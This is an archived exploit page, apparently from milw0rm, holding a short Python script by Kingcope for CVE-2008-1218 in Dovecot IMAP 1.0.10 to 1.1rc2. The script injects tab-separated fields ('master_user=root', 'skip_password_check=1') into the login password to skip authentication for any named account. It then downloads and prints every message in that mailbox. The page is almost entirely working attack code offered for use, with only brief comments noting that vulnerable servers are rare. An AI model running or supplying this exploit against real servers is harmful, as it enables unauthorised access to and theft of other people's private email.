<html><head><title>Dovecot IMAP 1.0.10 <= 1.1rc2 Remote Email Disclosure Exploit</title></head><pre>#lame Dovecot IMAP [1.0.10 -&gt; 1.1rc3] Exploit
#Here's an exploit for the recent TAB vulnerability in Dovecot.
#It's nothing special since in the wild there are few to none
#targets because of the special option which has to be set.
#see CVE Entry CVE-2008-1218
#Exploit written by Kingcope
import sys
import imaplib

print &quot;Dovecot IMAP [1.0.10 -&gt; 1.1rc2] Exploit&quot;
print &quot;Prints out all E-Mails for any account if special configuration option is set&quot;
print &quot;Exploit written by kingcope\n&quot;

if len(sys.argv)&lt;3:
     print &quot;usage: %s &lt;hostname/ip address&gt; &lt;account&gt; [-nossl]&quot; % sys.argv[0]
     exit(0);

if len(sys.argv)&gt;3 and sys.argv[3] == &quot;-nossl&quot;:
	M = imaplib.IMAP4(sys.argv[1])
else:
	M = imaplib.IMAP4_SSL(sys.argv[1])
M.login(sys.argv[2], &quot;\&quot;\tmaster_user=root\tskip_password_check=1\&quot;&quot;);
M.select()
print &quot;login succeeded.&quot;
typ, data = M.search(None, 'ALL')
k=0
for num in data[0].split():
    typ, data = M.fetch(num, '(RFC822)')
    print 'Message %s\n%s\n' % (num, data[0][1])
    k=k+1
M.close()
M.logout()
print &quot;Messages read: %s&quot; % k

# milw0rm.com [2008-03-14]</pre></html>